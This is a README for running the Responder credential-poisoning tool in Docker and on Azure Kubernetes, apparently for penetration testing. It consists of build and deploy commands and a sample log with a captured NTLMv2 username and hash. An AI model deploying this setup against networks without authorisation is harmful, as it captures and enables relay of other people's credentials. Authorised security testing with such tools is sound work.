## Docker-based platform for conducting MultiRelay attacks using Responder

Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.

> https://github.com/lgandx/Responder

```bash
docker build -t responder .

# Example with HTTP, SMB, HTTPS Auth services
docker run -p 80:80 -p 443:443 -p 445:445 -it responder
```

## Deploy it on Azure with AKS

```bash
kubectl apply -f 05-az-ns.yml  10-az-svc.yml  15-az-deploy.yml

# Get public IP
kubectl get svc --namespace=pentesting

kubectl get pods --namespace=pentesting
NAME                        READY   STATUS    RESTARTS   AGE
responder-c6bdbfd47-fq9tc   1/1     Running   0          4m9s1

# Logs
kubectl exec --stdin --tty responder-c6bdbfd47-fq9tc --namespace=pentesting -- tail -f /opt/Responder/logs/Responder-Session.log
04/20/2022 12:39:40 PM - [*] Skipping previously captured hash for \sdsd
04/20/2022 12:39:40 PM - [*] Skipping previously captured hash for \sdsd
04/20/2022 12:39:49 PM - [HTTP] NTLMv2 Client   : ::ffff:10.240.0.4
04/20/2022 12:39:49 PM - [HTTP] NTLMv2 Username : \DFDSF
04/20/2022 12:39:49 PM - [HTTP] NTLMv2 Hash     : DFDSF:::1122334455667788:85D41577BBA51617FD24E6E493D14A7B:0101000000000000AC5BD8BAB354D8016D70252D96F60DA900000000020008003500470059004F0001001E00570049004E002D005100390055004800510033004A004A00530055004D00040014003500470059004F002E004C004F00430041004C0003003400570049004E002D005100390055004800510033004A004A00530055004D002E003500470059004F002E004C004F00430041004C00050014003500470059004F002E004C004F00430041004C000800300030000000000000000000000000200000FDCC8F785DEC460BC517619765C590ECDE9ED1645FE815B0B17B9DAA4BD2E9EA0A001000000000000000000000000000000000000900220048005400540050002F00320030002E00320033002E00330035002E003100360037000000000000000000
```
